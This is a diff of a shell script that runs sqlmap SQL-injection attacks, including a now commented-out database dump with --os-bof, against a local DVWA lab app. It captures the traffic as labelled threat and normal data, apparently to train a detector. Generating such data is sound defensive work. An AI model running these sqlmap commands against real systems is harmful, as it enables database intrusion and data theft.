@@ -20,7 +20,7 @@ do
     listener_pid=($!)
     echo "aid=${listener_pid}"
     sleep 5
-    sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli/?id=3&Submit=Submit#" --risk 3 --level 5 --dbms mysql --cookie="security=low; PHPSESSID=lioef79pemtea2avicmsfm5u92" -p "id" --technique "${flag[$i]}" --answers="follow=Y,optimize=Y" --batch --mobile --param-exclude="token|session" --flush-session & #--delay=2 --tamper=space2comment &
+    sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli/?id=3&Submit=Submit#" --risk 3 --level 5 --dbms mysql --cookie="security=low; PHPSESSID=kb7opmp85s5pr4tinh1050us5q" -p "id" --technique "${flag[$i]}" --answers="follow=Y,optimize=Y" --batch --mobile --param-exclude="token|session" --flush-session & #--delay=2 --tamper=space2comment &
     sqlmap_pid=($!)
     echo "sid=${sqlmap_pid}"
     wait $sqlmap_pid
@@ -37,7 +37,7 @@ do
     listener_pid=($!)
     echo "aid=${listener_pid}"
     sleep 5
-    sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli/?id=3&Submit=Submit#" --risk 3 --level 5 --dbms mysql --cookie="security=low; PHPSESSID=lioef79pemtea2avicmsfm5u92" -p "id" --technique "${flag[$i]}" --answers="follow=Y,optimize=Y" --tamper=space2comment --batch --mobile --param-exclude="token|session" --flush-session & #--delay=2  &
+    sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli/?id=3&Submit=Submit#" --risk 3 --level 5 --dbms mysql --cookie="security=low; PHPSESSID=kb7opmp85s5pr4tinh1050us5q" -p "id" --technique "${flag[$i]}" --answers="follow=Y,optimize=Y" --tamper=space2comment --batch --mobile --param-exclude="token|session" --flush-session & #--delay=2  &
     sqlmap_pid=($!)
     echo "sid=${sqlmap_pid}"
     wait $sqlmap_pid
@@ -46,18 +46,29 @@ do
     sleep 3
 done
 ./test_env/force_stop.sh
-python3 httpsniffer.py --get --label-threat --technique "postex" &
-# kill slog_pid
-# ps -aux | grep python
-# pkill -f httpsniffer.py
-# todo: use tamper space2comment
-echo "Running post exploitation..."
-sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli/?id=3&Submit=Submit#" --risk 3 --level 5 --dbms mysql --cookie="security=low; PHPSESSID=lioef79pemtea2avicmsfm5u92" -p "id" --dump --batch --os-bof --flush-session
-echo "GET_http.csv lines: `wc -l ./data_temp/GET_http.csv`"
-echo "LOG_mysql.csv lines: `wc -l ./data_temp/LOG_mysql.csv`"
-./test_env/force_stop.sh
+# python3 httpsniffer.py --get --label-threat --technique "postex" &
+# # kill slog_pid
+# # ps -aux | grep python
+# # pkill -f httpsniffer.py
+# # todo: use tamper space2comment
+# echo "Running post exploitation..."
+# sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli/?id=3&Submit=Submit#" --risk 3 --level 5 --dbms mysql --cookie="security=low; PHPSESSID=kb7opmp85s5pr4tinh1050us5q" -p "id" --dump --batch --os-bof --flush-session
+# echo "GET_http.csv lines: `wc -l ./data_temp/GET_http.csv`"
+# echo "LOG_mysql.csv lines: `wc -l ./data_temp/LOG_mysql.csv`"
+# ./test_env/force_stop.sh
 echo "Replaying normal requests.."
 python3 httpsniffer.py --get --label-normal &
 listener_pid=($!)
-python3 labelman.py --live
+python3 labelman.py --live &
+labelman_pid=($!)
+wait $labelman_pid
+kill $listener_pid
+echo "Manual inference attack.."
+python3 httpsniffer.py --get --label-threat --technique "inference" &
+listener_pid=($!)
+python3 ./test_env/inference_attack.py &
+maninf_pid=($!)
+wait $maninf_pid
+kill $listener_pid
 echo "DONE"
+# while true; do clear; wc -l data_temp/LOG_mysql.csv; wc -l data_temp/GET_http.csv; done
